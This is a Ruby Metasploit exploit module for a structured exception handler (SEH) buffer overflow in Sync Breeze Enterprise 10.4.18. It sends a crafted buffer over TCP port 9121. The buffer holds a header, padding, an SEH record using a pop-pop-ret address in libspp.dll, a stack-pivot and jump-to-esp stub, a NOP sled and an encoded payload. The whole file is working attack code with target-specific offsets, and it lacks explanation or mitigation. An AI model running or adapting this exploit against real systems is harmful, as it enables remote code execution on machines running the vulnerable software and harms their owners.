##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking
  
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Sync Breeze 10.4.18 SEH',
      'Description' => %q{
        This module exploits a SEH overflow in Sync Breeze 10.4.18.
        This module was tested successfully against Windows 10 Pro 1709.
      },
      'Author' => 'Werebug',
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'BadChars' => "\x00",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Sync Breeze Enterprise 10.4.18', 
            {
              'Ret' => 0x1015a2f0, # pop pop ret in libspp.dll
              'Offset' => 128,
            }
          ],
        ],
      ))

    register_options(
      [
        Opt::RPORT(9121)
      ], self)
  end

  def exploit
    evil = "\x41" * (target['Offset'] - 4)
    evil << generate_seh_record(target['Ret'])
    evil << "\x66\x81\xc4\x68\x06" # add sp,1640
    evil << "\xff\xe4" # jmp esp
    evil << "\x90" * 32
    evil << payload.encoded
    evil << "\x42" * (1000 - evil.length)
   
    header = "\x75\x19\xba\xab"
    header << "\x03\x00\x00\x00"
    header << "\x00\x40\x00\x00"
    header << [evil.length].pack('<I')
    header << [evil.length].pack('<I')
    header << [evil[-1].ord].pack('<I')
    
    buffer = header + evil

    connect
    sock.put(buffer)
    disconnect
  end
end
